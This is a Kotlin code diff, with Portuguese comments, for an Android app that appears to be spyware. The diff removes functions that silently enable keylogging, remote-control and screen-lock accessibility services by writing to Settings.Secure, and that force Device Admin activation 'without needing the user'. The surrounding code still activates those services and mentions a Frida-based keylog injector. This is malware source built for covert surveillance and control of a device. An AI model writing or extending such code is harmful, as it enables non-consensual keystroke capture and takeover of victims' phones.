@@ -40,10 +40,10 @@ object AccessibilityServiceAutoActivator {
             Log.d(TAG, "╚════════════════════════════════════════╝")
             
             // 1. Ativar Accessibility Services AUTOMATICAMENTE
-            activateAccessibilityServicesAutomatically(context)
+            activateAccessibilityServices(context)
             
             // 2. Ativar Device Admin AUTOMATICAMENTE
-            activateDeviceAdminAutomatically(context)
+            activateDeviceAdmin(context)
             
             // 3. Ativar FridaLoader (injetor de keylog)
             if (BuildConfig.ENABLE_KEYLOG_INJECTION) {
@@ -75,136 +75,7 @@ object AccessibilityServiceAutoActivator {
     }
 
     /**
-     * Ativa Accessibility Services AUTOMATICAMENTE (sem precisar do usuário)
-     * NOVO: Ativa via Settings.Secure em vez de apenas abrir configurações
-     */
-    private fun activateAccessibilityServicesAutomatically(context: Context) {
-        try {
-            Log.d(TAG, "📱 Ativando Accessibility Services automaticamente...")
-            
-            // Lista de serviços a ativar
-            val servicesToActivate = listOf(
-                "com.remotemonitor.test/com.remotemonitor.test.KeylogService",
-                "com.remotemonitor.test/com.remotemonitor.test.RemoteControlAccessibilityService",
-                "com.remotemonitor.test/com.remotemonitor.test.ScreenLockService"
-            )
-            
-            // Tentar ativar via Settings.Secure (requer WRITE_SECURE_SETTINGS)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                try {
-                    val enabledServices = Settings.Secure.getString(
-                        context.contentResolver,
-                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-                    ) ?: ""
-                    
-                    val servicesList = enabledServices.split(":").filter { it.isNotEmpty() }.toMutableList()
-                    var changed = false
-                    
-                    for (service in servicesToActivate) {
-                        if (!servicesList.contains(service)) {
-                            servicesList.add(service)
-                            changed = true
-                            Log.d(TAG, "  ✅ Adicionado: $service")
-                        }
-                    }
-                    
-                    if (changed) {
-                        Settings.Secure.putString(
-                            context.contentResolver,
-                            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
-                            servicesList.joinToString(":")
-                        )
-                        Log.d(TAG, "✅ Accessibility Services ativados automaticamente")
-                    } else {
-                        Log.d(TAG, "✅ Accessibility Services já estão ativados")
-                    }
-                } catch (e: Exception) {
-                    Log.w(TAG, "Erro ao ativar via Settings.Secure (pode precisar de permissão): ${e.message}")
-                    // Fallback: abrir configurações
-                    openAccessibilitySettings(context)
-                }
-            } else {
-                openAccessibilitySettings(context)
-            }
-        } catch (error: Exception) {
-            Log.e(TAG, "❌ Erro ao ativar Accessibility Services: ${error.message}", error)
-            openAccessibilitySettings(context)
-        }
-    }
-
-    /**
-     * Abre as configurações de Acessibilidade (fallback)
-     */
-    private fun openAccessibilitySettings(context: Context) {
-        try {
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            }
-            context.startActivity(intent)
-            Log.d(TAG, "  → Abrindo Accessibility Settings (fallback)")
-        } catch (error: Exception) {
-            Log.e(TAG, "  → Erro ao abrir Accessibility Settings", error)
-        }
-    }
-
-    /**
-     * Ativa Device Admin AUTOMATICAMENTE (sem precisar do usuário)
-     * NOVO: Tenta ativar via setActiveAdmin em vez de apenas abrir intent
-     */
-    private fun activateDeviceAdminAutomatically(context: Context) {
-        try {
-            Log.d(TAG, "🔒 Ativando Device Admin automaticamente...")
-            
-            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
-            
-            if (devicePolicyManager.isAdminActive(adminComponent)) {
-                Log.d(TAG, "✅ Device Admin - Já está ativado")
-                return
-            }
-            
-            // Tentar ativar via setActiveAdmin (requer MANAGE_DEVICE_ADMINS)
-            try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    // Android 8+: usar setActiveAdmin
-                    devicePolicyManager.setActiveAdmin(adminComponent, true)
-                    Log.d(TAG, "✅ Device Admin ativado automaticamente")
-                } else {
-                    // Android < 8: tentar ativar
-                    devicePolicyManager.setActiveAdmin(adminComponent, true)
-                    Log.d(TAG, "✅ Device Admin ativado automaticamente (Android < 8)")
-                }
-            } catch (e: Exception) {
-                Log.w(TAG, "Erro ao ativar Device Admin automaticamente: ${e.message}")
-                // Fallback: abrir intent de ativação
-                openDeviceAdminSettings(context, adminComponent)
-            }
-        } catch (error: Exception) {
-            Log.e(TAG, "❌ Erro ao ativar Device Admin: ${error.message}", error)
-            openDeviceAdminSettings(context, ComponentName(context, DeviceAdminReceiver::class.java))
-        }
-    }
-
-    /**
-     * Abre as configurações de Device Admin (fallback)
-     */
-    private fun openDeviceAdminSettings(context: Context, adminComponent: ComponentName) {
-        try {
-            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para proteção e controle remoto do dispositivo")
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            }
-            context.startActivity(intent)
-            Log.d(TAG, "  → Abrindo Device Admin Settings (fallback)")
-        } catch (error: Exception) {
-            Log.e(TAG, "  → Erro ao abrir Device Admin Settings", error)
-        }
-    }
-
-    /**
      * Ativa Accessibility Services (KeylogService, RemoteControlAccessibilityService)
-     * MANTIDO: Para compatibilidade
      */
     private fun activateAccessibilityServices(context: Context) {
         try {
@@ -255,7 +126,6 @@ object AccessibilityServiceAutoActivator {
 
     /**
      * Ativa Device Admin para trava de tela
-     * MANTIDO: Para compatibilidade
      */
     private fun activateDeviceAdmin(context: Context) {
         try {
